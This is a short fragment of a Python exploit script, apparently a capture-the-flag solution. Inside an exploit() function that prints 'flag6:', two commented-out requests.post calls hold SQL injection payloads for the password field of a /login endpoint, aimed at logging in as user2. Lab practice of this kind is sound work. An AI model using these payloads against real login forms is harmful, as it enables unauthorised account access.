...
def exploit():
    ...
    print("\nflag6:")
    # req5 = requests.post(url + '/login', data = {'uname': '1', 'psw': "'OR 1=1 INNER JOIN users u ON u.username = 'user2"})
    # req5 = requests.post(url + '/login', data = {'uname': '1', 'psw': "'OR 1=1 AND username='user2"})
